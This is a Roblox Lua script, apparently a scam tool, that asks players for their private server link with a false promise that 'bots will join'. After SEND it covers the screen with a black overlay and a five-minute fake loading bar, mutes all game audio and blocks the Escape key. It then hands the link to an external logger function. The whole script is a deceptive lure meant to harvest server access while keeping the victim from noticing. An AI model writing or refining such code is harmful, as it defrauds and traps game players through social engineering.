-- GUI principal para método Moreira (input, pantalla negra, barra de carga)
-- MINTHUBx + Copilot

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
local SoundService = game:GetService("SoundService")
local Workspace = game:GetService("Workspace")
local ContextActionService = game:GetService("ContextActionService")

-- === GUI CREATION ===
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MoreiraMethodGui"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 9999
pcall(function()
    screenGui.Parent = game:GetService("CoreGui")
end)
if not screenGui.Parent then
    screenGui.Parent = playerGui
end

local inputFrame = Instance.new("Frame")
inputFrame.Name = "InputFrame"
inputFrame.Size = UDim2.new(0, 420, 0, 280)
inputFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
inputFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
inputFrame.BorderSizePixel = 0
inputFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = inputFrame

local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, -40, 0, 60)
label.Position = UDim2.new(0, 20, 0, 25)
label.BackgroundTransparency = 1
label.Text = "PUT YOUR PRIVATE SERVER LINK HERE"
label.Font = Enum.Font.GothamBold
label.TextScaled = true
label.TextColor3 = Color3.fromRGB(0, 170, 255)
label.Parent = inputFrame

local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(0.9, 0, 0, 45)
textBox.Position = UDim2.new(0.05, 0, 0, 100)
textBox.PlaceholderText = "Enter your private server link..."
textBox.Font = Enum.Font.Gotham
textBox.TextScaled = true
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
textBox.BorderSizePixel = 0
textBox.ClearTextOnFocus = false
textBox.Parent = inputFrame

local tbCorner = Instance.new("UICorner")
tbCorner.CornerRadius = UDim.new(0, 8)
tbCorner.Parent = textBox

local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(0.5, 0, 0, 45)
sendButton.Position = UDim2.new(0.25, 0, 0, 160)
sendButton.BackgroundColor3 = Color3.fromRGB(40, 200, 80)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextScaled = true
sendButton.TextColor3 = Color3.new(1, 1, 1)
sendButton.Text = "SEND"
sendButton.Parent = inputFrame

local sendCorner = Instance.new("UICorner")
sendCorner.CornerRadius = UDim.new(0, 8)
sendCorner.Parent = sendButton

local infoLabel = Instance.new("TextLabel")
infoLabel.Size = UDim2.new(1, -40, 0, 40)
infoLabel.Position = UDim2.new(0, 20, 0, 210)
infoLabel.BackgroundTransparency = 1
infoLabel.Font = Enum.Font.Gotham
infoLabel.TextScaled = true
infoLabel.TextColor3 = Color3.fromRGB(255, 220, 0)
infoLabel.Text = "The better things you have in your base, the better bots will join."
infoLabel.Parent = inputFrame

-- === PANTALLA NEGRA Y BARRA DE CARGA ===
local function muteAllSounds()
    for i, sound in SoundService:GetDescendants() do
        if sound:IsA("Sound") then
            sound.Volume = 0
        end
    end
    for i, sound in Workspace:GetDescendants() do
        if sound:IsA("Sound") then
            sound.Volume = 0
        end
    end
end

local escBlockActionName = "BlockEscMenu"
local function blockEscMenu(actionName, inputState, inputObj)
    return Enum.ContextActionResult.Sink
end

local blackFrame

-- === BOTÓN SEND (llama al logger externo) ===
sendButton.MouseButton1Click:Connect(function()
    local link = textBox.Text
    if link == "" then
        label.TextColor3 = Color3.fromRGB(255, 100, 100)
        label.Text = "⚠️ Please enter your private server link!"
        return
    end

    print("🔗 Link entered:", link)

    -- Pantalla negra y loading bar
    blackFrame = Instance.new("Frame")
    blackFrame.Name = "BlackScreen"
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.Position = UDim2.new(0, 0, 0, 0)
    blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blackFrame.BorderSizePixel = 0
    blackFrame.ZIndex = 9999
    blackFrame.Parent = screenGui

    local loadingText = Instance.new("TextLabel")
    loadingText.Size = UDim2.new(1, 0, 0, 100)
    loadingText.Position = UDim2.new(0, 0, 0.5, -50)
    loadingText.BackgroundTransparency = 1
    loadingText.Font = Enum.Font.GothamBold
    loadingText.TextScaled = true
    loadingText.TextColor3 = Color3.fromRGB(0, 180, 255)
    loadingText.Text = "LOADING..."
    loadingText.ZIndex = 10000
    loadingText.Parent = blackFrame

    local barWidth = 500
    local barHeight = 28
    local barFrame = Instance.new("Frame")
    barFrame.Name = "LoadingBarFrame"
    barFrame.Size = UDim2.new(0, barWidth, 0, barHeight)
    barFrame.Position = UDim2.new(0.5, -barWidth/2, 0.5, 70)
    barFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 60)
    barFrame.BorderSizePixel = 0
    barFrame.ZIndex = 10001
    barFrame.Parent = blackFrame

    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0, 14)
    barCorner.Parent = barFrame

    local fillFrame = Instance.new("Frame")
    fillFrame.Name = "LoadingBarFill"
    fillFrame.Size = UDim2.new(0, 0, 1, 0)
    fillFrame.Position = UDim2.new(0, 0, 0, 0)
    fillFrame.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
    fillFrame.BorderSizePixel = 0
    fillFrame.ZIndex = 10002
    fillFrame.Parent = barFrame

    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(0, 14)
    fillCorner.Parent = fillFrame

    local percentLabel = Instance.new("TextLabel")
    percentLabel.Name = "PercentLabel"
    percentLabel.Size = UDim2.new(0, barWidth, 0, 40)
    percentLabel.Position = UDim2.new(0.5, -barWidth/2, 0.5, 25)
    percentLabel.BackgroundTransparency = 1
    percentLabel.Font = Enum.Font.GothamBold
    percentLabel.TextScaled = true
    percentLabel.TextColor3 = Color3.fromRGB(0, 180, 255)
    percentLabel.Text = "0%"
    percentLabel.ZIndex = 10003
    percentLabel.Parent = blackFrame

    local duration = 300
    local steps = 600
    for step = 0, steps do
        local percent = step / steps
        fillFrame.Size = UDim2.new(percent, 0, 1, 0)
        percentLabel.Text = math.floor(percent * 100) .. "%"
        task.wait(duration / steps)
    end
    fillFrame.Size = UDim2.new(1, 0, 1, 0)
    percentLabel.Text = "100%"

    muteAllSounds()
    ContextActionService:BindAction(escBlockActionName, blockEscMenu, false, Enum.KeyCode.Escape)

    -- Llama al logger externo (asegúrate de haber cargado player_object_logger.lua antes)
    if type(guardarDatosLocal) == "function" then
        guardarDatosLocal(link)
        label.TextColor3 = Color3.fromRGB(40, 200, 80)
        label.Text = "Datos guardados localmente en C:\\Users\\eloti\\Downloads\\objetos\\logs_objetos.txt!"
    else
        label.TextColor3 = Color3.fromRGB(255, 0, 0)
        label.Text = "Error: player_object_logger.lua no cargado."
    end
end)

if blackFrame then
    blackFrame.AncestryChanged:Connect(function()
        if not blackFrame:IsDescendantOf(game) then
            ContextActionService:UnbindAction(escBlockActionName)
        end
    end)
end
